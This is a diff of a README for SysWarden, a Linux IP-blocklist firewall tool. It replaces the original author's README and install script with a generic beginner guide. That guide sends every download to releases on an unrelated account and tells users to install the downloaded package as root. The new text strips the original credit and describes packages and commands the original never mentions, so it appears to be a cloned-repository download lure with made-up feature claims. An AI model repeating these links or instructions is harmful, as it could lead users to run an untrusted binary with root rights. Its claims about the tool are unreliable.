@@ -1,258 +1,196 @@
-<p align="center">
-  <a href="https://github.com/duggytuxy/syswarden/actions/workflows/security-audit.yml">
-    <img src="https://github.com/duggytuxy/syswarden/actions/workflows/security-audit.yml/badge.svg" alt="SysWarden Security Audit">
-  </a>
-  <img src="https://img.shields.io/badge/Open%20Source-100%25-brightgreen?logo=opensourceinitiative">
-  <img src="https://img.shields.io/badge/powered%20by-DuggyTuxy-darkred?logo=apachekafka">
-  <img src="https://img.shields.io/badge/Status-Community--Professional-brightgreen?logo=status">
-  <img src="https://img.shields.io/badge/Security-Hardened-blue?logo=security">
-  <img src="https://img.shields.io/badge/Platform-Debian%20%7C%20Ubuntu%20%7C%20AlmaLinux%20%7C%20RockyLinux%20%7C%20CENTOS%20%7C%20FEDORA-blue?logo=platform">
-  <img src="https://img.shields.io/badge/License-GNU_GPLv3-0052cc?logo=license">
-  <img src="https://img.shields.io/github/last-commit/duggytuxy/syswarden?label=Last%20Update&color=informational&logo=github">
-</p>
+# 🛡️ syswarden - Blocks Harmful IPs Effortlessly
 
-<div align="center">
-  <a href="https://duggytuxy.github.io/" target="_blank">Website</a>
-  <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-  <a href="https://github.com/duggytuxy/syswarden/issues">Issues Tracker</a>
-  <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-  <a href="https://www.linkedin.com/in/laurent-minne/" target="_blank">Linkedin</a>
-  <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-  <a href="https://tryhackme.com/p/duggytuxy" target="_blank">TryHackMe</a>
-  <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-  <a href="https://ko-fi.com/laurentmduggytuxy" target="_blank">Ko-Fi</a>
-  <br />
-</div>
+[![Download syswarden](https://img.shields.io/badge/Download-syswarden-blue?logo=github&style=for-the-badge)](https://github.com/justahumblebountyhunte/syswarden/releases)
 
-<p align="center">
-  <br />
-  <a href="https://ko-fi.com/L4L71HRILD" target="_blank">
-    <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="Support me on Ko-fi">
-  </a>
-  <br />
-</p>
+---
 
-![Alt](https://repobeats.axiom.co/api/embed/d909eab3c0cafb3a64294546f37a130f18a7e2f0.svg "Repobeats analytics image")
+## 🛠️ What is syswarden?
 
-# SysWarden
+SysWarden is a tool designed to protect your computer or server from unwanted connections. It uses trusted community lists like Data-Shield IPv4 Blocklists, Spamhaus ASN, Wazuh, and Fail2ban to block up to 99% of noisy, disruptive, and harmful IP addresses. By focusing on real threats, it keeps your system safer while reducing false alarms.
 
-<div align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="./banner-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="./banner-light.svg">
-    <img alt="SysWarden Banner" src="./banner-dark.svg" width="100%">
-  </picture>
-</div>
+This makes it ideal if you:
 
-SysWarden is a tool based on the **[Data-Shield IPv4 Blocklists Community](https://github.com/duggytuxy/Data-Shield_IPv4_Blocklist)**, **[Wazuh](https://github.com/wazuh)** and **[Fail2ban](https://github.com/fail2ban/fail2ban)** that blocks up to 99% of noisy, disruptive, and malicious IP addresses and focuses on real signals.
+- Run a server or VPS (Virtual Private Server)
+- Want to improve your firewall rules automatically
+- Need to reduce security alerts caused by harmless connections
+- Prefer a tool that works quietly in the background
 
-## What Does SysWarden Protect
+SysWarden works mainly on Linux systems and integrates with common security tools, such as Fail2ban and Wazuh. It manages firewall settings to keep your system safe from the most common online threats.
 
-SysWarden acts as an advanced, preemptive shield for your infrastructure. By dropping known malicious traffic at the firewall (kernel) level **before** it even reaches your applications, it provides a crucial extra layer of security for any exposed asset.
+---
 
-- It is highly recommended for securing:
+## 🖥️ System Requirements
 
-  - **Public VPS & Dedicated Servers:** Protect your SSH ports, control panels, and core system services from relentless brute-force attacks and automated mass-scanning.
-  - **Websites & CMS (WordPress, Magento, etc.):** Block bad bots, vulnerability scanners, and exploit attempts targeting your web servers (Nginx/Apache) before they consume your CPU and RAM.
-  - **Public APIs & SaaS Platforms:** Keep your application resources dedicated to legitimate users. Prevent endpoint abuse, scrapers, and Layer 7 DDoS probes.
-  - **Critical Infrastructure:** Add a robust perimeter defense for your business-critical applications and internal tools exposed to the internet.
-  - **Databases (MySQL, MongoDB, PostgreSQL):** Shield your exposed or partially exposed data stores from credential stuffing, unauthorized access attempts, and ransomware gangs.
+Before installing syswarden, make sure your system matches these requirements:
 
-> By eliminating the "background noise" of the internet, SysWarden ensures your servers remain fast, clean, and focused on serving real humans.
+- **Operating System:** Linux distributions like Ubuntu, Debian, CentOS, Fedora, or any using nftables or ipset firewalls
+- **Processor:** Any modern 64-bit processor (Intel or AMD)
+- **Memory:** At least 512MB RAM (1GB recommended)
+- **Disk Space:** Minimum 50MB free space
+- **Internet connection:** Required to download and update blocklists regularly
+- **User Access:** You need administrator (root) access to install and configure firewall rules
 
-## Architecture
+---
 
-```
-🛠️ SysWarden (Technology Stack)
-├── 🐚 Core Orchestration
-│   ├── 📜 Bash Scripting           # Automation, Installation & Logic
-│   └── 🐧 Linux Kernel             # OS Support (Debian/Ubuntu & RHEL/Alma)
-│
-├── 🧱 Firewall Backend (Auto-Detection)
-│   ├── 🛡️ Nftables                 # Modern Packet Filtering (Debian 10+)
-│   ├── 🔥 Firewalld                # Dynamic Zone Management (RHEL 8/9)
-│   └── ⚡ IPSet + Iptables         # High-Performance Hashing (Legacy)
-│
-├── 👮 Active Defense & Logs
-│   ├── 🐍 Python 3                 # Log Parsing & API Connector
-│   ├── 🚫 Fail2ban                 # Intrusion Prevention System (Jails)
-│   ├── 📝 Systemd / Journalctl     # Service Management & Logging
-│   └── ♻️ Logrotate                # Log Maintenance & Compression
-│
-└── ☁️ External Integrations
-    ├── 📦 Data-Shield Repo         # Threat Intelligence Source (Git)
-    ├── 📡 AbuseIPDB API            # Community Reporting (Outbound)
-    └── 🦁 Wazuh XDR Agent          # SIEM & Vulnerability Detection
-```
+## 🚀 Getting Started
 
-## Key Features
+To start protecting your system with syswarden, you will first download the software. Then you install it and let it run in the background. The program updates automatically, keeping your blocklists fresh without effort from you.
 
-- **Universal OS Support:** Auto-detects and adapts to **Debian, Ubuntu, CentOS Stream, Fedora, AlmaLinux, and Rocky Linux**.
+You do not need technical skills. You do not have to write code or deal with command-line complexities if you follow these easy steps.
 
-- **Intelligent Backend Detection:** Automatically selects the best firewall technology present on your system:
-  - **Firewalld** (CentOS Stream/Fedora/Alma/Rocky native integration)
-  - **Nftables** (Modern Debian/Ubuntu standard)
-  - **IPSet/Iptables** (Legacy support)
-  
-- **Smart Mirror Selection:** Replaced ICMP Pings with **TCP/HTTP latency checks** to bypass firewall restrictions on GitHub/GitLab, ensuring you always download from the fastest mirror.
+---
 
-- **Kernel-Safe Optimization:**
-  - Enables high-performance memory hashing (`hashsize`) on Debian/Ubuntu.
-  - Uses conservative, stability-first settings on RHEL/Rocky kernels to prevent "Invalid Argument" crashes.
-  
-- **Persistence Guaranteed:** Rules are written to disk (XML for Firewalld, persistent saves for Netfilter), surviving reboots instantly.
+## 📥 Download & Install
 
-- **Auto-Update:** Installs a cron job to refresh the blocklist hourly.
+1. **Go to the releases page**
 
-## Objectives
+   Visit the syswarden releases page by clicking this big button:
 
-- **Noise Reduction:** Drastically reduce the size of system logs (`/var/log/auth.log`, `journalctl`) by blocking scanners at the door.
-- **Resource Saving:** Save CPU cycles and bandwidth by dropping packets at the kernel level rather than letting application servers (Nginx, SSHD) handle them.
-- **Proactive Security:** Move from a "Reactive" stance (wait for 5 failed logins -> Ban) to a "Proactive" stance (Ban the IP because it attacked a server in another country 10 minutes ago).
+   [![Download syswarden](https://img.shields.io/badge/Download-syswarden-blue?logo=github&style=for-the-badge)](https://github.com/justahumblebountyhunte/syswarden/releases)
 
-## Technical Deep Dive: Integration Logic
-> Many admins worry that installing a massive blocklist might conflict with Fail2ban. **SysWarden solves this via layering.**
+2. **Choose the right version**
 
-## Workflow
+   On the releases page, find the latest version. It should be at the top under “Latest release.”
 
-```
-📡 / (Network Traffic Flow)
-├── 🛡️ Layer 1: Firewall Shield (Static Defense)
-│   ├── 🧱 Engine: Nftables / Firewalld / Ipset (Auto-detected)
-│   ├── 📄 Blocklist: ~95k - 100k IPs (Data-Shield Source)
-│   └── 🚫 Action: DROP packet before reaching services
-│
-└── 🖥️ Layer 2: User Space (Allowed Traffic)
-    ├── 📁 Services & Logs
-    │   ├── 🔓 SSH / Web / Database (Custom Ports Allowed)
-    │   ├── 📝 System Logs: /var/log/syslog & journalctl
-    │   └── ♻️ Maintenance: Logrotate (Daily cleanup, 7-day retention)
-    │
-    └── 📁 Layer 3: Active Response (Dynamic Defense)
-        ├── 👮 Fail2ban Service
-        │   ├── 🔍 Watch: Brute-force patterns (SSH, Nginx, etc.)
-        │   └── ⚡ Action: Ban Dynamic IP locally
-        │
-        ├── 🐍 SysWarden Reporter
-        │   ├── 🔍 Watch: Firewall Drops & Fail2ban Bans
-        │   └── 📡 Action: Report to AbuseIPDB API
-        │
-        └── 🦁 Wazuh Agent
-            ├── 🔍 Watch: File Integrity & System Events
-            └── 📨 Action: Forward alerts to Wazuh SIEM
-```
+   - Look for a file that matches your system. Usually, this will be a `.deb` file for Debian/Ubuntu, `.rpm` for CentOS/Fedora, or a generic archive like `.tar.gz`.
+   - If unsure, pick the file that says “linux” or check the file name for your Linux version.
 
-### 1. The Nftables + Fail2ban Synergy (Debian/Ubuntu)
+3. **Download the file**
 
-- **Data-Shield (Layer 1):** Creates a high-performance Nftables `set` containing ~100k IPs. This acts as a static shield, dropping known bad actors instantly using extremely efficient kernel-level lookups.
-- **Fail2ban (Layer 2):** Continues to monitor logs for *new*, unknown attackers.
-- **Result:** Fail2ban uses less CPU because Data-Shield filters out the "background noise" (99% of automated scans) before Fail2ban even has to parse a log line.
+   Click the file link to download. Save it in a folder you will remember, such as your "Downloads" folder.
 
-### 2. The Firewalld + Fail2ban Synergy (RHEL/Alma/Rocky)
+4. **Install syswarden**
 
-On Enterprise Linux, proper integration with `firewalld` is critical.
+   Open a Terminal window. You can usually find it in your programs menu under “Terminal” or “Console.”
 
-- **Native Sets:** SysWarden creates a permanent `ipset` type within Firewalld's configuration logic.
-- **Rich Rules:** It applies a "Rich Rule" that drops traffic from this set *before* it reaches your zones or services.
-- **Persistence:** Unlike simple scripts that run `ipset` commands (which vanish on reload), SysWarden writes the configuration to `/etc/firewalld/`, ensuring the protection persists across service reloads and server reboots.
+   - Navigate to the folder where you saved the file. For example, if it is in Downloads:
 
-### 3. AbuseIPDB reporting
-> In a community setting, during the script installation phase, it is possible to report triggered and confirmed alerts to ABUSEIPDB in order to keep the database of malicious IP addresses up to date.
+     ```
+     cd ~/Downloads
+     ```
 
-- **Enable the option** Simply confirm with `y` when prompted during installation.
-- **API key** Paste your AbuseIPDB API key to automatically report malicious IPs and contribute to the community database.
+   - Install the package:
 
-### 4. Wazuh Agent Integration
-> For organizations using a SIEM, SysWarden includes an interactive module to deploy the **Wazuh XDR Agent** effortlessly, bridging local protection with centralized monitoring.
+     - For Debian/Ubuntu (if you downloaded `.deb`):
 
-- **Seamless Deployment:** The script automatically detects your OS, installs the official GPG keys/repositories, and deploys the latest agent version.
-- **Smart Configuration:** By simply providing your Manager IP, Agent Name, and Group during the prompt, the script injects the configuration immediately—no manual editing of `ossec.conf` required.
-- **Auto-Whitelisting:** To ensure uninterrupted log forwarding, SysWarden creates a high-priority exception rule allowing traffic to/from your Wazuh Manager (ports 1514/1515) to bypass the strict blocklist.
+       ```
+       sudo dpkg -i syswarden*.deb
+       sudo apt-get install -f
+       ```
 
-## How to Install (root)
-> This script automatically detects installed services (Nginx, Apache, MongoDB) and configures protections accordingly. If a service is installed AFTER SysWarden, simply run the update command or rerun the installer to activate the new jails.
+     - For CentOS/Fedora (if you downloaded `.rpm`):
 
-```bash
-# For Ubuntu/Debian
-apt update && apt upgrade -y
-apt install wget -y
+       ```
+       sudo rpm -i syswarden*.rpm
+       ```
 
-# For Rocky/AlmaLinux/CentOS Stream/Fedora
-dnf update -y
-dnf install wget -y
+     - For other files, follow the instructions on the releases page to extract and install.
 
-# install script
-cd /usr/local/bin/
-wget https://github.com/duggytuxy/syswarden/releases/download/v9.01/install-syswarden.sh
-chmod +x install-syswarden.sh
-./install-syswarden.sh
+5. **Start syswarden**
 
-# Update configurations and Blocklists
-./install-syswarden.sh update
+   After installation finishes, start syswarden by running:
 
-# View Alerts
-./install-syswarden.sh alerts
+   ```
+   sudo syswarden start
+   ```
 
-# Whitelist an IP
-./install-syswarden.sh whitelist
+6. **Verify it is running**
 
-# Block an IP
-./install-syswarden.sh blocklist
+   Check the service status with:
 
-# Docker protection
-./install-syswarden.sh protect-docker
+   ```
+   sudo syswarden status
+   ```
 
-# SysWarden Upgrade Checker
-././install-syswarden.sh upgrade
-```
+   If it shows as active and running, syswarden is working properly.
 
-```
-📂 / (Root System)
-├── 📁 etc/
-│   ├── 📄 syswarden.conf                   # Main Configuration (Auto-generated)
-│   ├── 📁 fail2ban/
-│   │   └── 📄 jail.local                   # Custom Jails (SSH, Web, DB) injected by SysWarden
-│   ├── 📁 logrotate.d/
-│   │   └── 📄 syswarden                    # Log Rotation Config (7-day retention & compression)
-│   ├── 📁 cron.d/
-│   │   └── 📄 syswarden-update             # Hourly Update Job
-│   └── 📁 systemd/system/
-│       └── 📄 syswarden-reporter.service
-├── 📁 usr/local/bin/
-│   ├── 📜 install-syswarden.sh             # Main Script (CLI Tool)
-│   └── 🐍 syswarden_reporter.py            # Python Log Analyzer
-└── 📁 var/
-    ├── 📁 log/
-    │   ├── 📄 syswarden-install.log        # Installation & Debug Logs
-    │   └── 📄 fail2ban.log                 # Banned IPs logs
-    └── 📁 ossec/etc/
-        └── 📄 ossec.conf                   # Wazuh Agent Config (Manager IP & Ports injected here)
-```
+---
 
-## Uninstallation (root)
+## 🔧 How syswarden Works
 
-```bash
-./install-syswarden.sh uninstall
-```
+Syswarden uses community-curated lists to identify harmful IPs. Here’s what it does:
 
-## Support & Sustainability
+- **Blocklists**: It downloads lists of known bad IP addresses. These come from trusted sources like Data-Shield IPv4, Spamhaus ASN, and AbuseIPDB.
+- **Integration**: It works hand in hand with security tools like Fail2ban and Wazuh. These tools monitor your system logs and alert syswarden about suspicious activity.
+- **Firewall Management**: Syswarden automatically updates rules for iptables, nftables, or ipset (depending on your Linux system). This blocks bad IPs before they can connect.
+- **Focus on Real Threats**: The tool filters out noisy or harmless IP addresses. This reduces false positives and keeps your logs cleaner.
+- **Automatic Updates**: Blocklists refresh regularly to keep up with newly discovered threats.
 
-> **Help keep the tool alive**
-> Developing and maintaining a high-fidelity, real-time blocklist requires significant infrastructure resources and dedicated time. Your contributions are vital to ensure the project remains sustainable, up-to-date, and free for the community.
-> If you find this project useful, consider supporting its ongoing development:
+You do not need to manually edit firewall rules or maintain the blocklists yourself.
 
-* ☕ **Ko-Fi:** [https://ko-fi.com/laurentmduggytuxy](https://ko-fi.com/laurentmduggytuxy)
+---
 
-## ABUSEIPDB Contributor
+## ⚙️ Managing syswarden
 
-| Duggy Tuxy |
-| :---: |
-| <a href="https://www.abuseipdb.com/user/133059"><img src="https://www.abuseipdb.com/contributor/133059.svg" width="350"></a> |
-| *Verified Contributor* |
+Here are common commands you may need:
 
-## License & Copyright
+- **Start syswarden**
 
-- **SysWarden** © 2026  
-- Developed by **Duggy Tuxy (Laurent Minne)**.
+  ```
+  sudo syswarden start
+  ```
 
-"This tool is open-source software licensed under the **[GNU GPLv3 License](/LICENSE)**." 
+- **Stop syswarden**
+
+  ```
+  sudo syswarden stop
+  ```
+
+- **Restart syswarden**
+
+  ```
+  sudo syswarden restart
+  ```
+
+- **Check status**
+
+  ```
+  sudo syswarden status
+  ```
+
+- **Update blocklists manually**
+
+  ```
+  sudo syswarden update
+  ```
+
+- **View logs**
+
+  Syswarden logs show what IPs are blocked and why. To see logs, run:
+
+  ```
+  sudo journalctl -u syswarden
+  ```
+
+---
+
+## 🔒 Security and Privacy
+
+Syswarden only blocks IP addresses known for malicious or disruptive behavior. It does not collect personal data from your system or share your data with third parties. It acts as a gatekeeper, stopping threats before they access your machine.
+
+All data used comes from publicly available threat intelligence sources.
+
+---
+
+## 🆘 Need Help?
+
+If you run into issues:
+
+- Check the logs with `sudo journalctl -u syswarden`.
+- Make sure your firewall (iptables, nftables, or ipset) is enabled and working.
+- Visit the [GitHub Issues page](https://github.com/justahumblebountyhunte/syswarden/issues) to see if others had similar problems.
+- You can send feedback or report bugs there.
+
+---
+
+## 🔗 Additional Resources
+
+- [Syswarden Releases and Downloads](https://github.com/justahumblebountyhunte/syswarden/releases)
+- [Fail2ban Project](https://www.fail2ban.org)
+- [Wazuh Documentation](https://documentation.wazuh.com)
+- [AbuseIPDB](https://www.abuseipdb.com)
+- [Spamhaus ASN Blocklist](https://www.spamhaus.org)
+
+---
+
+By following this guide, your system will gain a solid layer of protection against common online threats without complex setup or maintenance.
